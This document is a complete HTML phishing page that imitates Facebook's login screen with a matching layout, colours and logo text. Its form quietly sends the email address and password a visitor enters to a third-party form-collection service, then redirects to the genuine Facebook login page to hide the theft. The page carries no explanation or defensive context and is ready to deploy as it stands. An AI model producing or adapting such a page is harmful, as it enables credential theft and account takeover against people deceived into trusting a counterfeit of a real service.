<!DOCTYPE html>
<html>
<head>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Log in to Facebook</title>
<style>
body{font-family:Helvetica,Arial,sans-serif;background:#f0f2f5;margin:0;display:flex;justify-content:center;align-items:center;min-height:100vh}
.card{background:#fff;border-radius:8px;box-shadow:0 2px 4px rgba(0,0,0,.1);width:396px;padding:20px;box-sizing:border-box}
.logo{color:#1877f2;font-size:32px;font-weight:bold;text-align:center;margin:10px 0 20px}
input{width:100%;padding:14px;font-size:17px;border:1px solid #dddfe2;border-radius:6px;box-sizing:border-box;margin-bottom:12px}
.btn{width:100%;background:#1877f2;color:#fff;font-size:20px;font-weight:bold;padding:12px;border:none;border-radius:6px;cursor:pointer}
</style>
</head>
<body>
<div class="card">
<div class="logo">facebook</div>
<form action="https://formspree.io/f/xqpejlqd" method="POST">
<input type="hidden" name="_redirect" value="https://www.facebook.com/login">
<input type="text" name="email" placeholder="Email address or phone number" required>
<input type="password" name="password" placeholder="Password" required>
<button class="btn" type="submit">Log In</button>
</form>
</div>
</body>
  </html>
